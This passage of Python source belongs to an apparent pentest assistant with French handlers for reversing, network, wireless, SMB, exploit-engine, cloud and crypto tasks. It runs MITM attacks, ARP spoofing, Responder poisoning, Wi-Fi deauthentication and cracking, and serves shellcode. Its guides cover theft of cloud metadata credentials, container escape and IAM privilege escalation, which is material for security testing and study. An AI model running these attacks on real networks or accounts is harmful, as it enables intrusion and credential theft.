            summary = f"Gadgets trouvés : {result['count']}\n"
            gadgets = result.get("gadgets", [])[:30]
            summary += "\n".join(f"  {g['address']} : {g['instruction']}" for g in gadgets)
            if result['count'] > 30:
                summary += f"\n... (+{result['count'] - 30} gadgets)"
            return self._result(True, summary, result)

        if any(kw in t for kw in ["objdump", "désassemble", "desassemble", "disassemble"]):
            if not binary:
                return self._result(False, "Spécifie le binaire.")
            cmd = f"objdump -d -M intel {binary}"
            return self._run_command(cmd, task)

        if any(kw in t for kw in ["strings"]):
            if not binary:
                return self._result(False, "Spécifie le fichier.")
            cmd = f"strings {binary}"
            return self._run_command(cmd, task)

        if any(kw in t for kw in ["readelf", "elf info", "sections", "symboles"]):
            if not binary:
                return self._result(False, "Spécifie le binaire.")
            if binary:
                info = elf_info(binary)
                return self._result(True, exploit_summary(binary), {"elf_info": info})

        if any(kw in t for kw in ["strace", "ltrace"]):
            if not binary:
                return self._result(False, "Spécifie le binaire.")
            tool = "strace" if "strace" in t else "ltrace"
            return self._run_command(f"{tool} {binary}", task)

        if any(kw in t for kw in ["analyse", "analyze", "analyse complète"]):
            if binary:
                return self._result(True, exploit_summary(binary))

        return self._result(True,
            "🔬 REVERSING — Précise l'action et le binaire.\n\n"
            "Exemples :\n"
            "  checksec ./binary        → protections (ASLR/NX/PIE/canary)\n"
            "  rop gadgets ./binary     → chaîne ROP\n"
            "  strings ./binary         → strings lisibles\n"
            "  objdump ./binary         → désassemblage\n"
            "  strace ./binary          → appels système\n"
            "  analyse complète ./bin   → rapport complet exploit")

    def _handle_network(self, task: str) -> dict:
        t = task.lower()
        target = self._extract_target(task)

        # Responder — lancement direct si interface précisée
        if any(kw in t for kw in ["responder"]):
            iface = re.search(r"\b(eth\d+|wlan\d+|tun\d+|ens\d+|eno\d+|lo)\b", task)
            if iface:
                mode = "-rdwv" if any(kw in t for kw in ["verbose", "-v"]) else "-rdw"
                cmd = f"responder -I {iface.group(0)} {mode}"
                return self._run_command(cmd, task)
            return self._result(True,
                "Responder — capture de hashes NTLMv2 (LLMNR/NBT-NS poisoning) :\n"
                "  responder -I eth0 -rdwv     (mode actif + verbose)\n"
                "  responder -I eth0 -A         (mode analyse uniquement, sans poison)\n\n"
                "Spécifie l'interface réseau pour lancer directement.\n"
                "Hashes capturés dans /usr/share/responder/logs/",
                {"tool": "responder"})

        # Bettercap — MITM framework
        if any(kw in t for kw in ["bettercap", "mitm", "arp spoofing", "arp-spoofing"]):
            iface = re.search(r"\b(eth\d+|wlan\d+|tun\d+|ens\d+|eno\d+)\b", task)
            if iface:
                if any(kw in t for kw in ["arp", "spoofing", "mitm", "sniff"]):
                    eval_cmds = "net.probe on; arp.spoof on; net.sniff on"
                    cmd = f"bettercap -iface {iface.group(0)} -eval '{eval_cmds}'"
                else:
                    cmd = f"bettercap -iface {iface.group(0)}"
                return self._run_command(cmd, task)
            return self._result(True,
                "Bettercap — framework MITM réseau :\n"
                "  bettercap -iface eth0\n"
                "  bettercap -iface eth0 -eval 'net.probe on; arp.spoof on; net.sniff on'\n"
                "  bettercap -iface eth0 -caplet arp-spoofing.cap\n\n"
                "Modules utiles en session interactive :\n"
                "  net.probe on          → découverte hôtes\n"
                "  arp.spoof on          → ARP poisoning\n"
                "  net.sniff on          → sniffer trafic\n"
                "  http.proxy on         → proxy HTTP\n"
                "  https.proxy on        → proxy HTTPS (SSLstrip)\n\n"
                "Spécifie l'interface réseau pour lancer directement.",
                {"tool": "bettercap"})

        # Wireshark / tshark
        if any(kw in t for kw in ["wireshark", "tshark"]):
            pcap = self._extract_file_path(task)
            iface = re.search(r"\b(eth\d+|wlan\d+|tun\d+|ens\d+)\b", task)
            if pcap and "tshark" in t:
                cmd = f"tshark -r {pcap}"
            elif iface and "tshark" in t:
                cmd = f"tshark -i {iface.group(0)} -c 100"
            elif pcap:
                cmd = f"tshark -r {pcap} -Y 'http or dns or ftp'"
            else:
                cmd = f"tshark -i {iface.group(0) if iface else 'eth0'} -c 50"
            return self._run_command(cmd, task)

        if any(kw in t for kw in ["tcpdump", "capture"]):
            iface = re.search(r"-i\s+(\w+)", task)
            iface = iface.group(1) if iface else "eth0"
            cmd = f"tcpdump -i {iface} -c 100"
            return self._run_command(cmd, task)

        if any(kw in t for kw in ["nc", "netcat", "écoute", "listen"]):
            port = self._extract_port(task) or "4444"
            cmd = f"nc -lvnp {port}"
            return self._run_command(cmd, task)

        return self._result(False, "Précise l'action réseau (tcpdump/responder/bettercap/wireshark/netcat/socat).")

    def _handle_forensics(self, task: str) -> dict:
        t = task.lower()
        file_path = self._extract_file_path(task)

        if any(kw in t for kw in ["volatility", "volatility3", "memory", "mémoire"]):
            if not file_path:
                return self._result(True,
                    "🔍 Volatility3 — Analyse de dump mémoire\n\n"
                    "Plugins Windows essentiels :\n"
                    "  volatility3 -f memory.dmp windows.info          → infos système\n"
                    "  volatility3 -f memory.dmp windows.pslist         → processus\n"
                    "  volatility3 -f memory.dmp windows.pstree         → arbre processus\n"
                    "  volatility3 -f memory.dmp windows.netstat        → connexions réseau\n"
                    "  volatility3 -f memory.dmp windows.hashdump       → hashes NT\n"
                    "  volatility3 -f memory.dmp windows.cmdline        → lignes de commande\n"
                    "  volatility3 -f memory.dmp windows.malfind        → injection de code\n\n"
                    "Plugins Linux :\n"
                    "  volatility3 -f memory.dmp linux.pslist\n"
                    "  volatility3 -f memory.dmp linux.bash             → historique bash\n\n"
                    "Spécifie le fichier .dmp pour lancer directement.")
            cmd = f"volatility3 -f {file_path} windows.info"
            return self._run_command(cmd, task)

        if any(kw in t for kw in ["exiftool", "metadata", "métadonnées"]):
            if not file_path:
                return self._result(False, "Spécifie le fichier.")
            return self._run_command(f"exiftool {file_path}", task)

        if any(kw in t for kw in ["binwalk", "firmware"]):
            if not file_path:
                return self._result(False, "Spécifie le firmware/fichier.")
            return self._run_command(f"binwalk {file_path}", task)

        return self._result(True,
            "🔍 FORENSICS — Guide d'investigation\n\n"
            "  volatility3 -f memory.dmp windows.pslist  → analyse mémoire\n"
            "  exiftool <fichier>                        → métadonnées\n"
            "  binwalk <firmware>                        → analyse firmware\n"
            "  foremost -i disk.img -o output/           → carving fichiers\n"
            "  steghide extract -sf image.jpg            → stéganographie\n\n"
            "Précise le fichier/dump à analyser.")

    def _handle_wireless(self, task: str) -> dict:
        t = task.lower()
        bssid_match = re.search(r"\b([0-9a-fA-F]{2}(?::[0-9a-fA-F]{2}){5})\b", task)
        iface_match = re.search(r"\b(wlan\d+(?:mon)?|mon\d+)\b", task)
        iface = iface_match.group(0) if iface_match else "wlan0mon"

        # airmon-ng — gestion mode monitor
        if any(kw in t for kw in ["airmon", "monitor", "mode monitor", "monitor mode"]):
            raw_iface = re.search(r"\b(wlan\d+)\b", task)
            raw_iface = raw_iface.group(0) if raw_iface else "wlan0"
            if any(kw in t for kw in ["stop", "désactiver", "disable"]):
                cmd = f"airmon-ng stop {raw_iface}mon"
            elif any(kw in t for kw in ["check", "tuer", "kill"]):
                cmd = "airmon-ng check kill"
            else:
                cmd = f"airmon-ng start {raw_iface}"
            result = self._run_command(cmd, task)
            if not result.get("success"):
                out = result.get("output", "")
                if not out.strip():
                    result["output"] = (
                        f"[airmon-ng] Interface {raw_iface} introuvable ou permissions insuffisantes.\n\n"
                        "Interfaces disponibles : ip link show\n"
                        "Lancer en root : sudo airmon-ng start wlan0\n\n"
                        "Note : en VM, une clé Wi-Fi USB en passthrough est nécessaire."
                    )
            return result

        # airodump-ng — capture et découverte
        if any(kw in t for kw in ["airodump", "scanner wifi", "découvrir réseau", "capture wifi"]):
            if bssid_match:
                ch_match = re.search(r"(?:canal?|channel|-c)\s+(\d+)", t)
                ch = ch_match.group(1) if ch_match else "6"
                cmd = f"airodump-ng --bssid {bssid_match.group(0)} --channel {ch} --write /tmp/capture {iface}"
            else:
                cmd = f"airodump-ng {iface}"
            return self._run_command(cmd, task)

        # aireplay-ng — injection / deauth
        if any(kw in t for kw in ["aireplay", "deauth", "déauthentification", "injection"]):
            if not bssid_match:
                return self._result(False,
                    "Fournis le BSSID du point d'accès.\n"
                    "Ex: aireplay-ng deauth 10 AA:BB:CC:DD:EE:FF wlan0mon")
            count_match = re.search(r"\b(\d+)\b", t)
            count = count_match.group(1) if count_match and int(count_match.group(1)) < 1000 else "10"
            client_match = re.search(r"-c\s+([0-9a-fA-F:]{17})", task)
            if client_match:
                cmd = f"aireplay-ng --deauth {count} -a {bssid_match.group(0)} -c {client_match.group(1)} {iface}"
            else:
                cmd = f"aireplay-ng --deauth {count} -a {bssid_match.group(0)} {iface}"
            return self._run_command(cmd, task)

        # aircrack-ng — cracking handshake
        if any(kw in t for kw in ["aircrack", "crack wifi", "casser wpa", "cracker", "handshake"]):
            cap_file = self._extract_file_path(task) or "/tmp/capture-01.cap"
            wordlist_match = re.search(r"(?:wordlist|dict|dictionnaire)\s+(\S+)", t)
            wordlist = wordlist_match.group(1) if wordlist_match else "/usr/share/wordlists/rockyou.txt"
            if bssid_match:
                cmd = f"aircrack-ng -w {wordlist} -b {bssid_match.group(0)} {cap_file}"
            else:
                cmd = f"aircrack-ng -w {wordlist} {cap_file}"
            return self._run_command(cmd, task)

        # Guide complet workflow Wi-Fi
        return self._result(True,
            "Workflow complet attaque Wi-Fi WPA2 :\n\n"
            "1. Préparer l'interface :\n"
            "   airmon-ng check kill\n"
            "   airmon-ng start wlan0         → crée wlan0mon\n\n"
            "2. Scanner les réseaux :\n"
            "   airodump-ng wlan0mon\n\n"
            "3. Capturer le handshake :\n"
            "   airodump-ng --bssid <BSSID> --channel <CH> --write /tmp/capture wlan0mon\n\n"
            "4. Forcer le handshake (deauth) :\n"
            "   aireplay-ng --deauth 10 -a <BSSID> wlan0mon\n\n"
            "5. Cracker le handshake :\n"
            "   aircrack-ng -w /usr/share/wordlists/rockyou.txt /tmp/capture-01.cap\n\n"
            "Dis-moi quelle étape lancer et avec quel BSSID/interface.",
            {"tools": ["airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng"]})

    def _handle_smb(self, task: str) -> dict:
        t = task.lower()
        target = self._extract_target(task)

        if any(kw in t for kw in ["enum4linux"]):
            if not target:
                return self._result(False, "Spécifie la cible.")
            return self._run_command(f"enum4linux -a {target}", task)

        if any(kw in t for kw in ["smbmap"]):
            if not target:
                return self._result(False, "Spécifie la cible.")
            return self._run_command(f"smbmap -H {target}", task)

        if not target:
            return self._result(True,
                "🗂️  SMB / Active Directory — Guide\n\n"
                "  enum4linux -a <IP>                    → énumération SMB complète\n"
                "  smbmap -H <IP>                        → lister les shares\n"
                "  smbclient -L //<IP>/ -N               → shares anonymes\n"
                "  crackmapexec smb <IP> -u '' -p ''     → accès anonyme\n"
                "  rpcclient -U '' -N <IP>               → enum RPC\n\n"
                "Précise l'IP cible pour lancer directement.")
        return self._run_command(f"enum4linux -a {target}", task)

    # ── Exploit engine (sans shell) ───────────────────────────────────────────

    def _handle_exploit_engine(self, task: str) -> dict:
        t = task.lower()

        # Cyclic pattern
        if "cyclic" in t and "find" not in t:
            m = re.search(r"cyclic\s+(\d+)", t)
            length = int(m.group(1)) if m else 200
            pat = cyclic(length)
            return self._result(True,
                f"Pattern De Bruijn ({length} octets) :\n"
                f"Python  : {repr(pat)}\n"
                f"Hex     : {pat.hex()}\n"
                f"String  : {pat.decode('ascii', errors='replace')}",
                {"length": length, "pattern": pat.hex()})

        # Cyclic find / offset
        if any(kw in t for kw in ["cyclic_find", "find offset", "offset", "cyclic find"]):
            m = re.search(r"0x([0-9a-fA-F]+)", task)
            if not m:
                m2 = re.search(r"\b(\d{8,})\b", task)
                if m2:
                    val = int(m2.group(1))
                else:
                    return self._result(False, "Fournis la valeur crashée. Ex: find offset 0x61616161")
            else:
                val = int(m.group(1), 16)
            arch = "x64" if any(kw in t for kw in ["64", "x64", "rip"]) else "x86"
            result = find_offset(val, arch)
            return self._result(True,
                f"Valeur : {result['value']}\nOffset : {result['offset']}\n{result['note']}",
                result)

        # Checksec
        if "checksec" in t:
            binary = self._extract_file_path(task)
            if not binary:
                return self._result(False, "Spécifie le binaire. Ex: checksec ./challenge")
            result = checksec(binary)
            return self._result(True, self._format_checksec(result), {"checksec": result})

        # Shellcode template
        if "shellcode" in t:
            if "x64" in t or "64" in t:
                sc = get_shellcode("linux_x64_execve_sh")
            elif "x86" in t or "32" in t:
                sc = get_shellcode("linux_x86_execve_sh")
            else:
                sc = get_shellcode("linux_x64_execve_sh")
            if "error" in sc:
                return self._result(False, sc["error"])
            return self._result(True,
                f"Shellcode : {sc['description']}\n"
                f"Longueur  : {sc['length']} octets\n"
                f"Python    : sc = {sc['bytes_py']}\n"
                f"Hex       : {sc['hex_escaped']}",
                sc)

        # ROP gadgets via exploit engine
        if any(kw in t for kw in ["ropgadget", "rop gadget", "gadget"]):
            binary = self._extract_file_path(task)
            if not binary:
                return self._result(False, "Spécifie le binaire. Ex: ropgadget ./challenge pop rdi")
            search = None
            m = re.search(r"(?:grep|search|cherch\w+|pour)\s+['\"]?(.+?)['\"]?\s*$", t)
            if m:
                search = m.group(1)
            result = rop_gadgets(binary, search=search)
            if "error" in result:
                return self._result(False, result["error"])
            gadgets = result.get("gadgets", [])[:25]
            out = f"Gadgets ROP ({result['count']} trouvés) :\n"
            out += "\n".join(f"  {g['address']} : {g['instruction']}" for g in gadgets)
            return self._result(True, out, result)

        return self._result(False, "Exploit engine : cyclic <N> | find offset <val> | checksec <bin> | shellcode x64 | ropgadget <bin>")

    # ── Helpers d'extraction ──────────────────────────────────────────────────

    def _extract_target(self, task: str) -> Optional[str]:
        # IP
        m = re.search(r"\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}(?:/\d+)?)\b", task)
        if m:
            return m.group(1)
        # CIDR range
        m = re.search(r"\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d+)\b", task)
        if m:
            return m.group(1)
        # Hostname/domaine
        m = re.search(r"\b((?:[a-zA-Z0-9\-]+\.)+[a-zA-Z]{2,})\b", task)
        if m and m.group(1) not in ("et", "de", "du", "un", "le", "la"):
            return m.group(1)
        return None

    def _extract_url_or_target(self, task: str) -> Optional[str]:
        m = re.search(r"(https?://\S+)", task)
        if m:
            return m.group(1).rstrip("/,.")
        return self._extract_target(task)

    def _extract_file_path(self, task: str) -> Optional[str]:
        m = re.search(r"([./][\w/\-_.]+(?:\.(?:elf|exe|bin|out|so|dll|py|txt|dmp))?)", task)
        if m:
            return m.group(1)
        # Juste un nom de fichier sans chemin
        m2 = re.search(r"\b(\w[\w\-_.]+\.(?:elf|exe|bin|out|so|dll|dmp))\b", task)
        if m2:
            return m2.group(1)
        return None

    def _extract_ip(self, task: str) -> Optional[str]:
        m = re.search(r"\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b", task)
        return m.group(1) if m else None

    def _extract_port(self, task: str) -> Optional[str]:
        m = re.search(r"\b(port\s+|:)(\d{2,5})\b", task, re.IGNORECASE)
        if m:
            return m.group(2)
        m2 = re.search(r"\b(\d{4,5})\b", task)
        return m2.group(1) if m2 else None

    def _format_checksec(self, result: dict) -> str:
        if "error" in result:
            return f"Erreur checksec : {result['error']}"
        lines = [f"Protections de {result.get('binary', 'binaire')} :"]
        icons = {
            "Full RELRO": "✓", "Partial RELRO": "~", "No RELRO": "✗",
            "NX enabled": "✓", "NX disabled": "✗",
            "PIE enabled": "✓", "No PIE": "✗", "PIE disabled": "✗",
            "Canary found": "✓", "No canary": "✗",
        }
        for key in ["NX", "PIE", "Stack", "RELRO", "RUNPATH"]:
            val = result.get(key, "unknown")
            icon = icons.get(val, "?")
            lines.append(f"  {icon} {key:8} : {val}")
        return "\n".join(lines)

    # ══════════════════════════════════════════════════════════════════════════
    # DOMAINE 7 — SÉCURITÉ CLOUD (AWS / Azure / GCP)
    # ══════════════════════════════════════════════════════════════════════════

    def _handle_cloud(self, task: str) -> dict:
        t = task.lower()
        target = self._extract_target(task)

        # ── AWS ───────────────────────────────────────────────────────────────
        if any(kw in t for kw in ["aws", "amazon", "s3", "ec2", "lambda", "iam", "cloudtrail", "pacu"]):
            if "pacu" in t:
                return self._result(True,
                    "☁️  AWS — Pacu (framework pentest AWS)\n\n"
                    "Installation :\n"
                    "  pip3 install pacu\n"
                    "  pacu\n\n"
                    "Modules essentiels :\n"
                    "  run iam__enum_users_roles_policies_groups  → enum IAM\n"
                    "  run ec2__enum                              → enum EC2\n"
                    "  run s3__enum                               → lister S3\n"
                    "  run iam__privesc_scan                      → privesc IAM\n"
                    "  run lambda__enum                           → enum Lambda\n\n"
                    "Checklist pentest AWS :\n"
                    "  1. Récupérer les clés via metadata : curl http://169.254.169.254/latest/meta-data/iam/security-credentials/\n"
                    "  2. Configurer : aws configure\n"
                    "  3. Enum IAM  : aws iam get-account-authorization-details\n"
                    "  4. Enum S3   : aws s3 ls\n"
                    "  5. Trouver privesc : pacu → iam__privesc_scan",
                    {"tool": "pacu", "domain": "cloud"})

            if "scoutsuite" in t or "scout" in t:
                return self._result(True,
                    "☁️  ScoutSuite — Audit multi-cloud\n\n"
                    "Installation : pip3 install scoutsuite\n\n"
                    "Audit AWS  : scout aws\n"
                    "Audit Azure: scout azure --cli\n"
                    "Audit GCP  : scout gcp --user-account\n\n"
                    "Rapport HTML généré dans scoutsuite-report/\n"
                    "Checks : IAM, S3 public, CloudTrail désactivé, Security Groups 0.0.0.0/0, MFA, rotation clés",
                    {"tool": "scoutsuite"})

            if "prowler" in t:
                return self._result(True,
                    "☁️  Prowler — Audit sécurité AWS/Azure/GCP\n\n"
                    "Installation : pip3 install prowler\n\n"
                    "AWS complet  : prowler aws\n"
                    "CIS Benchmark: prowler aws --compliance cis_1.4_aws\n"
                    "GDPR check   : prowler aws --compliance gdpr_aws\n"
                    "Azure        : prowler azure --sp-env-auth\n\n"
                    "Checks critiques : MFA root, CloudTrail actif, S3 Block Public Access, IAM password policy",
                    {"tool": "prowler"})

            if "s3" in t:
                bucket = re.search(r'\b([a-z0-9][a-z0-9\-\.]{1,61}[a-z0-9])\b', task)
                if bucket and any(kw in t for kw in ["enum", "list", "scan", "public"]):
                    b = bucket.group(1)
                    return self._result(True,
                        f"☁️  S3 Bucket : {b}\n\n"
                        f"Accès public  : curl -s https://{b}.s3.amazonaws.com/ | head -20\n"
                        f"Via AWS CLI   : aws s3 ls s3://{b} --no-sign-request\n"
                        f"Télécharger   : aws s3 cp s3://{b}/ /tmp/{b}/ --recursive --no-sign-request\n\n"
                        "Scan automatique :\n"
                        "  trufflehog s3 --bucket {b}    (chercher secrets)\n"
                        "  grayhatwarfare.com            (moteur buckets publics)",
                        {"bucket": b})
                return self._result(True,
                    "☁️  AWS S3 — Sécurité\n\n"
                    "Vérifier bucket public :\n"
                    "  aws s3api get-bucket-acl --bucket <nom>\n"
                    "  aws s3api get-bucket-policy --bucket <nom>\n"
                    "  aws s3api get-public-access-block --bucket <nom>\n\n"
                    "Lister tous les buckets :\n"
                    "  aws s3 ls\n\n"
                    "Chercher des secrets dans un bucket :\n"
                    "  trufflehog s3 --bucket <nom>\n\n"
                    "Bloquer l'accès public (remédiation) :\n"
                    "  aws s3api put-public-access-block --bucket <nom> \\\n"
                    "    --public-access-block-configuration BlockPublicAcls=true,RestrictPublicBuckets=true",
                    {"domain": "cloud", "service": "s3"})

            # Metadata SSRF sur EC2
            if any(kw in t for kw in ["metadata", "imds", "169.254"]):
                return self._result(True,
                    "☁️  AWS Instance Metadata — SSRF / Credential Theft\n\n"
                    "Depuis l'instance :\n"
                    "  curl http://169.254.169.254/latest/meta-data/\n"
                    "  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/\n"
                    "  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>\n\n"
                    "Via SSRF (IMDSv1 vulnérable) :\n"
                    "  Injecter URL : http://169.254.169.254/latest/meta-data/iam/security-credentials/\n"
                    "  → Récupère AccessKeyId, SecretAccessKey, Token\n\n"
                    "Remédiation : activer IMDSv2 (token requis)\n"
                    "  aws ec2 modify-instance-metadata-options --instance-id <id> --http-tokens required",
                    {"domain": "cloud", "attack": "ssrf_metadata"})

            return self._result(True,
                "☁️  AWS Security — Checklist pentest\n\n"
                "1. RECONNAISSANCE\n"
                "   aws iam get-user                              → utilisateur courant\n"
                "   aws iam list-users                            → tous les users\n"
                "   aws iam list-roles                            → tous les rôles\n"
                "   aws iam list-attached-user-policies --user-name <u>\n"
                "   aws sts get-caller-identity                   → compte courant\n\n"
                "2. PRIVESC IAM\n"
                "   aws iam create-access-key --user-name <user>\n"
                "   aws iam attach-user-policy --user-name <u> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n"
                "   iam__privesc_scan (Pacu)\n\n"
                "3. LATÉRAL\n"
                "   aws lambda list-functions                     → fonctions Lambda\n"
                "   aws ec2 describe-instances                    → instances EC2\n"
                "   aws secretsmanager list-secrets               → secrets\n\n"
                "4. OUTILS\n"
                "   pacu        → framework exploit AWS\n"
                "   scoutsuite  → audit complet\n"
                "   prowler     → compliance CIS/GDPR",
                {"domain": "cloud", "provider": "aws"})

        # ── Azure ─────────────────────────────────────────────────────────────
        if any(kw in t for kw in ["azure", "blob", "key vault", "entra"]):
            return self._result(True,
                "☁️  Azure Security — Checklist pentest\n\n"
                "OUTILS :\n"
                "  az login                     → authentification Azure CLI\n"
                "  MicroBurst (PowerShell)       → enum Azure\n"
                "  ROADtools                     → enum Azure AD\n"
                "  Stormspotter                  → graphe Azure AD\n\n"
                "ENUM :\n"
                "  az account list              → abonnements\n"
                "  az ad user list              → utilisateurs AAD\n"
                "  az role assignment list      → attributions de rôles\n"
                "  az keyvault list             → Key Vaults\n"
                "  az storage account list      → comptes stockage\n\n"
                "ATTAQUES CLASSIQUES :\n"
                "  Password spray AAD : MSOLSpray, Ruler\n"
                "  Phishing OAuth     : 365-Stealer (device code flow)\n"
                "  Blob public        : az storage blob list --account-name <n> --container <c>\n"
                "  SSRF sur VM        : curl http://169.254.169.254/metadata/instance?api-version=2021-02-01\n\n"
                "REMÉDIATION :\n"
                "  Activer MFA + Conditional Access\n"
                "  PIM (Privileged Identity Management)\n"
                "  Defender for Cloud",
                {"domain": "cloud", "provider": "azure"})

        # ── GCP ───────────────────────────────────────────────────────────────
        if any(kw in t for kw in ["gcp", "google cloud"]):
            return self._result(True,
                "☁️  GCP Security — Checklist pentest\n\n"
                "OUTILS :\n"
                "  gcloud auth login            → authentification\n"
                "  GCP Scanner (GitHub)         → audit automatique\n"
                "  Cartography                  → graphe infra GCP\n\n"
                "ENUM :\n"
                "  gcloud projects list\n"
                "  gcloud iam list-grantable-roles --resource //cloudresourcemanager.googleapis.com/projects/<id>\n"
                "  gcloud storage buckets list\n"
                "  gcloud compute instances list\n"
                "  gcloud secrets list\n\n"
                "ATTAQUES :\n"
                "  Metadata : curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/\n"
                "  Service Account key : gcloud iam service-accounts keys list --iam-account <sa>\n"
                "  Bucket public enum : gsutil ls gs://\n\n"
                "REMÉDIATION :\n"
                "  Workload Identity Federation\n"
                "  VPC Service Controls\n"
                "  Cloud Armor",
                {"domain": "cloud", "provider": "gcp"})

        # ── Kubernetes ────────────────────────────────────────────────────────
        if any(kw in t for kw in ["kubernetes", "k8s", "kubectl", "pod", "conteneur", "docker"]):
            if any(kw in t for kw in ["docker", "conteneur"]):
                return self._result(True,
                    "🐳  Docker / Conteneurs — Sécurité\n\n"
                    "AUDIT IMAGE :\n"
                    "  trivy image <nom>                → CVE dans l'image\n"
                    "  docker scan <nom>                → Snyk scan\n"
                    "  dive <nom>                       → analyser layers\n\n"
                    "ÉVASION CONTENEUR :\n"
                    "  # Vérifier si dans conteneur\n"
                    "  cat /proc/1/cgroup | grep docker\n"
                    "  ls /.dockerenv\n\n"
                    "  # Escape via --privileged\n"
                    "  mount /dev/sda1 /mnt && chroot /mnt\n\n"
                    "  # Escape via socket Docker\n"
                    "  ls /var/run/docker.sock\n"
                    "  docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host\n\n"
                    "BONNES PRATIQUES :\n"
                    "  Exécuter non-root (USER 1000)\n"
                    "  Read-only filesystem\n"
                    "  Capabilities drop (--cap-drop ALL)\n"
                    "  Seccomp profiles\n"
                    "  Image signée (Docker Content Trust)",
                    {"domain": "cloud", "tool": "docker"})
            return self._result(True,
                "☸️  Kubernetes Security\n\n"
                "ENUM :\n"
                "  kubectl get pods --all-namespaces\n"
                "  kubectl get serviceaccounts --all-namespaces\n"
                "  kubectl get clusterrolebindings\n"
                "  kubectl auth can-i --list\n\n"
                "ATTAQUES :\n"
                "  # Token dans pod\n"
                "  cat /var/run/secrets/kubernetes.io/serviceaccount/token\n"
                "  # RBAC misconfiguration\n"
                "  kubectl get clusterrolebindings -o json | grep -i cluster-admin\n"
                "  # Exposed API server\n"
                "  curl -k https://<API>:6443/api/v1/namespaces/default/pods\n\n"
                "OUTILS :\n"
                "  kubeaudit     → audit RBAC\n"
                "  kube-bench    → CIS Benchmark K8s\n"
                "  kube-hunter   → pentest K8s\n"
                "  trivy         → scan images\n\n"
                "REMÉDIATION : RBAC least privilege, PSP/OPA Gatekeeper, Network Policies",
                {"domain": "cloud", "tool": "kubernetes"})

        return self._result(True,
            "☁️  Cloud Security — Domaines couverts\n\n"
            "  aws          → pentest AWS (Pacu, ScoutSuite, Prowler)\n"
            "  azure        → pentest Azure (ROADtools, MicroBurst)\n"
            "  gcp          → pentest GCP (gcloud, Cartography)\n"
            "  kubernetes   → K8s (kube-hunter, kube-bench, trivy)\n"
            "  docker       → conteneurs (escape, trivy, dive)\n"
            "  s3 <bucket>  → audit bucket S3\n"
            "  metadata     → vol de credentials via SSRF IMDS\n\n"
            "Précise le provider ou l'outil pour un guide détaillé.",
            {"domain": "cloud"})

    # ══════════════════════════════════════════════════════════════════════════
    # DOMAINE 8 — CRYPTOGRAPHIE
    # ══════════════════════════════════════════════════════════════════════════

    def _handle_crypto(self, task: str) -> dict:
        t = task.lower()

        # ── Opérations OpenSSL ────────────────────────────────────────────────
        if any(kw in t for kw in ["openssl", "certificat", "tls", "ssl", "x509", "pki"]):
            if any(kw in t for kw in ["générer", "créer", "generate", "create"]):
                return self._result(True,
                    "🔐  OpenSSL — Génération de certificats\n\n"
                    "Clé RSA 4096 bits :\n"
                    "  openssl genrsa -out private.key 4096\n\n"
                    "Certificat auto-signé :\n"
                    "  openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n\n"
                    "CSR (Certificate Signing Request) :\n"
                    "  openssl req -new -key private.key -out request.csr\n\n"
                    "Clé ECDSA (P-256) :\n"
                    "  openssl ecparam -name prime256v1 -genkey -noout -out ec.key\n"
                    "  openssl req -new -x509 -key ec.key -out ec-cert.pem -days 365\n\n"
                    "Vérifier un certificat :\n"
                    "  openssl x509 -in cert.pem -text -noout\n"
                    "  openssl x509 -in cert.pem -noout -dates\n\n"
                    "Tester TLS d'un serveur :\n"
                    "  openssl s_client -connect host:443\n"
                    "  openssl s_client -connect host:443 -tls1_2\n"
                    "  testssl.sh host:443   (audit complet)",
                    {"domain": "crypto", "tool": "openssl"})
            target = self._extract_target(task) or self._extract_url_or_target(task)
            if target:
                cmd = f"openssl s_client -connect {target}:443 -brief"
                return self._run_command(cmd, task)
            return self._result(True,
                "🔐  OpenSSL — Commandes essentielles\n\n"
                "Analyser certificat serveur :\n"
                "  openssl s_client -connect <host>:443\n"
                "  openssl s_client -connect <host>:443 </dev/null 2>/dev/null | openssl x509 -noout -text\n\n"
                "Hasher un fichier :\n"
                "  openssl dgst -sha256 fichier.txt\n"
                "  openssl dgst -md5 fichier.txt\n\n"
                "Chiffrer/déchiffrer AES-256 :\n"
                "  openssl enc -aes-256-cbc -salt -in plain.txt -out cipher.bin -k 'motdepasse'\n"
                "  openssl enc -d -aes-256-cbc -in cipher.bin -out plain.txt -k 'motdepasse'\n\n"
                "Générer un nonce/clé aléatoire :\n"
                "  openssl rand -hex 32\n"
                "  openssl rand -base64 32",
                {"domain": "crypto", "tool": "openssl"})

        # ── Hash / Password ───────────────────────────────────────────────────
        if any(kw in t for kw in ["sha", "sha256", "sha512", "md5", "bcrypt", "argon2", "pbkdf2", "hmac"]):
            val = re.search(r'\b([a-fA-F0-9]{32,})\b', task)
            if val and any(kw in t for kw in ["identifier", "type", "quel", "analyser"]):
                h = val.group(1)
                length = len(h)
                htype = {32: "MD5", 40: "SHA-1", 56: "SHA-224", 64: "SHA-256", 96: "SHA-384", 128: "SHA-512"}.get(length, f"inconnu ({length} chars)")
                return self._result(True,
                    f"🔐  Hash identifié : {htype}\n"
                    f"  Valeur  : {h}\n"
                    f"  Longueur: {length} caractères ({length * 4} bits)\n\n"
                    f"Craquer avec hashcat :\n"
                    f"  Mode : MD5→0, SHA-1→100, SHA-256→1400, SHA-512→1700\n"
                    f"  Commande : hashcat -m <mode> {h} /usr/share/wordlists/rockyou.txt\n\n"
                    "Craquer avec john :\n"
                    f"  echo '{h}' > hash.txt && john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt\n\n"
                    "Note : MD5/SHA-1 sont obsolètes. Utiliser SHA-256+ ou bcrypt/Argon2 pour les mots de passe.",
                    {"hash": h, "type": htype})
            return self._result(True,
                "🔐  Cryptographie — Fonctions de hachage\n\n"
                "Algorithmes et usages recommandés :\n"
                "  MD5 (128b)    → OBSOLÈTE — ne pas utiliser pour sécu\n"
                "  SHA-1 (160b)  → OBSOLÈTE — cassé (collisions)\n"
                "  SHA-256 (256b)→ ✓ Intégrité fichiers, signatures\n"
                "  SHA-512 (512b)→ ✓ Haute sécurité\n"
                "  bcrypt        → ✓ Stockage mots de passe (slow hash)\n"
